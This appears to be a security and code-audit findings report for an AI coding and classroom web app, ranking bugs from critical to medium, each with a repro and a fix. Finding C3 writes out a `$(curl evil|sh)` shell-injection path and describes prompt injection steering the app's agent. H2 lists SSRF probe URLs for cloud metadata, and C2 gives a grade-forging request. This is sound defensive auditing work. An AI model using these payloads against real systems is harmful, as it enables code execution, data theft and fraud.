## 1. Findings by severity

### 🔴 CRITICAL

**C1 — Cross-tenant data leak: `/api/repos` & `/api/search` share one process-global store**
`src/lib/store.ts:93-97` · `src/app/api/repos/route.ts:40` · `src/app/api/search/route.ts`
`store()` returns a single `globalThis.__helixStore` with **no `userId` scoping**. User A `POST /api/repos` imports a (possibly private) repo's full file contents into that global store; User B then `GET /api/repos` sees A's project list + repoUrl and `GET /api/search?q=...` searches A's source.
*Repro:* A imports repo → B (any other signed-in user on the same warm instance) reads it. *Caveat:* the store is per warm serverless instance, so the leak is opportunistic but reliable on a single long-lived / low-traffic instance.
*Fix:* scope the store per `userId`, or gate these legacy routes behind `dbEnabled() === false` and back real import/search with the per-user `Workspace`/embeddings tables (as `/api/workspaces/*` already do). **Verified in source.**

**C2 — Student can forge their own homework grade to 100%**
`src/app/api/lab/progress/route.ts:65-71, 33-45`
The Zod schema accepts `quizScore` straight from the request body; `syncLessonAssignments` writes it verbatim as `grade = "${round(quizScore*100)}%"`, `status: "reviewed"` into `AssignmentSubmission`. There is **no server-side recompute from `quizAnswers`**.
*Repro:* `POST /api/lab/progress {"lessonId":"<assigned>","status":"completed","quizScore":1}` → auto-graded 100% without answering.
*Fix:* recompute the score server-side from `quizAnswers` against the lesson's stored answer key; ignore the client `quizScore`. **Verified in source.**

**C2b — Auto-grade clobbers an instructor's manual grade** (same route, `:39-44`)
`upsert.update: data` runs unconditionally, so a student re-completing a lesson overwrites a human-entered grade/feedback back to the quiz auto-grade.
*Fix:* skip the update when the submission is already human-`reviewed`; track auto vs. manual grading. **Verified in source.**

**C3 — Shell command injection via git-push deletion paths (sandbox-scoped RCE)**
`src/lib/runner/git-push.ts:116`
`delCmds` interpolates each deletion path into `git rm -f -- "${p.replace(/"/g,'\\"')}"` inside `sh -c`. The escape only neutralizes `"`; `$(...)`, backticks, and `\` remain live. Deletion paths come from `overlay.deletions` (model/virtual-FS controlled) and — unlike `overlay.files` — are **not** run through `validateFiles`.
*Repro:* a workspace whose overlay deletes a path like `` `id` `` or `$(curl evil|sh)` executes commands in the build VM (which holds the user's git token in `$GIT_URL`).
*Scope/severity note:* the VM and token belong to the workspace owner, so direct blast radius is self-scoped; the multi-tenant risk is **prompt-injection** steering the agent to emit a malicious deletion path, or sandbox-escape. Treat as Critical for a hosted platform.
*Fix:* pass deletions as argv to a single non-shell `git rm`, or validate each deletion path with the same safe-path regex as files. Same class at `src/lib/runner/headless-check.ts:64-69` (entry filename interpolated after only single-quote stripping). **Verified in source.**

### 🟠 HIGH

**H1 — IDOR on HelixVideo: any premium user can poll/download any user's video by job id**
`src/app/api/video/[id]/content/route.ts:18-22` · `src/app/api/video/route.ts` GET · `src/lib/video.ts:79-112`
The guard checks `isPremiumUser(userId,email)` but never verifies the `id` belongs to the caller. `GET /api/video?id=<other-job-id>` / `…/content` runs `openai.videos.retrieve/downloadContent` on the shared house key and returns another user's status + final MP4. No `VideoJob → owner` record exists.
*Fix:* persist `userId → videoId` on create and assert ownership before any provider call.

**H2 — Authenticated SSRF via `/api/local-models?base=`**
`src/app/api/local-models/route.ts:19-49`
Any signed-in user supplies `?base=<url>`; the server fetches `${base}/models` with only `z.url()` — no private-IP blocklist. `?base=http://169.254.169.254/latest/meta-data` or `http://10.0.0.5:6379` probes internal services / cloud metadata; the `reachable` flag + body leak results. Lower-reach sibling: `src/app/api/ai/validate-key/route.ts:53`.
*Fix:* in prod, resolve host and reject loopback / RFC-1918 / link-local / `.internal`, or use an allowlist.

**H3 — Provider error text leaks to users in agent/chat paths (defeats the video-branding promise)**
`src/lib/ai-agent.ts:151, 283, 461` → `src/lib/agent-turn.ts:518`
`video-errors.ts` brands provider/billing strings (and unit tests enforce it), but the **chat/agent** paths return raw `e.message`. A `400 "Billing hard limit has been reached"` or `insufficient_quota` from Anthropic/Bedrock surfaces verbatim in chat — exactly the leak branding exists to prevent, applied only at video call sites.
*Fix:* generalize `brandVideoMessage` into a shared sanitizer and route all provider errors through it before returning to the client.

**H4 — Concurrent-turn quota double-spend (check-then-act, no lock)**
`src/lib/token-budget.ts:62-132` + `src/lib/ai-usage.ts:51-72`
`checkTokenBudget` reads-then-decides; spend is recorded only after the turn. N concurrent chat requests all pass the gate before any records usage. The "overshoot ≤ one turn" comment holds only for serial turns — with the 100/hr route limit a free/guest user can fire many parallel builds past the cap.
*Fix:* atomic conditional decrement (`UPDATE … WHERE used + reserve <= limit`) or per-user turn serialization; reconcile actuals after.

**H5 — Chat streaming fetch is never aborted on unmount or on a new send**
`src/components/studio/chat-panel.tsx:668-690, 762-820`
The `AbortController` is a local var with no ref and no unmount cleanup. Navigating away mid-stream keeps the `reader.read()` loop running and fires `setState` after unmount; a second `send()` runs a concurrent reader interleaving state. (Same pattern, lower severity: `build-studio.tsx:401-417`.)
*Fix:* hold the controller in a ref; `abort()` + `reader.cancel()` in an unmount effect and at the top of each `send()`.

**H6 — Unsaved editor edits lost silently on navigation / tab close**
`src/components/studio/workspace-panel.tsx:163, 264, 639-646`
Manual edits live only in the `dirty` map until explicit Save. There is **no `beforeunload` guard and no confirm-on-navigate** — refresh/close/router-link drops edits with no warning. Related: `applyChangesManifest` (`:349-354`) discards the user's unsaved `dirty[path]` when the AI writes the same file, no merge/rollback.
*Fix:* `beforeunload` gated on `dirtyCount > 0`; confirm before destructive nav; conflict-prompt on AI clobber.

**H7 — Hand-rolled modals: no focus trap, no `role="dialog"`/`aria-modal`, no Escape**
`src/components/studio/env-dialog.tsx:80` · `src/components/studio/push-dialog.tsx:204` · `src/components/screens/workspace-card-menu.tsx:269-290`
Raw `fixed inset-0` overlays — Tab escapes behind, Escape doesn't close, no dialog role/label. Keyboard + screen-reader users are stuck. The Radix `DialogContent` primitive already in the repo (used correctly by `deploy-dialog.tsx`) provides all of this.
*Fix:* port these three to `ui/dialog.tsx`.

**H8 — No deadline enforcement on submission or lesson auto-grade**
`src/app/api/spaces/[id]/assignments/[assignmentId]/submit/route.ts:34-51` + `lab/progress/route.ts:33-45`
`dueAt` is stored/displayed but never gates state transitions — students submit (and auto-grade to `reviewed`) arbitrarily late.
*Fix:* reject or mark-late past `dueAt` (configurable hard/soft).

**H9 — Permanent, non-revocable, non-expiring space invite links**
`src/app/api/spaces/join/route.ts:25-49` · `prisma/schema.prisma:112`
Join is by a single static `joinCode` (`@unique`, no `expiresAt`/status/rotation). Anyone who ever sees it can join forever; no revoke. The richer `Invite` model (expiry + `codeHash`) exists but Spaces don't use it.
*Fix:* add expiry + rotation, or move Spaces onto the hashed/expiring `Invite` flow.

### 🟡 MEDIUM

- **M1 — Video stream not aborted on client disconnect** — `src/app/api/video/[id]/content/route.ts:24-31` / `video.ts:106`. No `req.signal` wiring; closing `<video>` mid-download leaks the upstream Sora socket on an expensive path. *Fix:* thread `AbortSignal`, cancel on disconnect.
- **M2 — `cron/jobs` auth fails OPEN when `CRON_SECRET` is unset** — `src/app/api/cron/jobs/route.ts:18`. `if (CRON_SECRET && header !== …)` skips the check entirely when the var is missing; anonymous `GET` then drives job re-triggering. Sibling `cron/premium-freshness` fails closed. *Fix:* reject when the secret is unset; `timingSafeEqual`. **Verified in source.**
- **M3 — Anthropic/Bedrock agent errors are fatal with no fallback** — `src/lib/agent-turn.ts:482-519`. The OpenAI path has a house→Bedrock fallback + retry; the Anthropic/local branch returns on first error. *Fix:* mirror the fallback; wrap the Anthropic stream in `withRetry`.
- **M4 — Duplicate billed `responses.create` on stream error/disconnect** — `src/lib/agent-turn.ts:537-546`. Empty `catch {}` always falls through to a full non-streamed retry with no abort, so a disconnect re-bills the whole turn. *Fix:* thread abort; retry only on genuine transient provider errors.
- **M5 — Guest/free build metering is nondeterministic on disconnect** — `chat/route.ts:165-172` + `agent-turn.ts:897-919`. Non-premium turns aren't handed to `after()`; teardown after provider spend but before the persist `$transaction` leaves tokens unmetered (free unmetered builds via disconnect-spam). *Fix:* meter a reservation up front, or run metering in `after()` for all tiers.
- **M6 — Stale `busy` closure in `send()` guard** — `chat-panel.tsx:602`. UI button is protected, but programmatic callers can double-send before re-render. *Fix:* guard on the existing `localSend` ref.
- **M7 — Streaming AI output has no `aria-live`** — `chat-panel.tsx:1613-1621`. Screen-reader users get no feedback during a multi-minute build. *Fix:* `role="log" aria-live="polite"` on the streaming/activity region.
- **M8 — AI lesson generate/assist has no prompt-injection isolation** — `lab/lessons/generate/route.ts:65-73`, `assist/route.ts:82-92`. Teacher free-text (and `z.unknown()` manifest) is concatenated into the prompt undelimited. Output is re-validated by `coerceLessonDoc` (limits blast radius), and it's teacher/owner-scoped. *Fix:* delimit untrusted input as data.
- **M9 — Orphaned education rows / dangling `Assignment.lessonId`** — `prisma/schema.prisma:154, 446-501`. `Lesson`/`LessonProgress`/`LabWidget` carry no FKs; deleting a Lesson leaves assignments pointing at it and the auto-grade sync silently no-ops/mis-targets. *Fix:* cleanup on delete or `onDelete: SetNull` FKs.
- **M10 — `popoverHideTimer` never cleared on unmount** — `workspace-panel.tsx:225, 446-448`. setState-after-unmount if the panel unmounts within 300 ms. *Fix:* clear in an unmount effect.
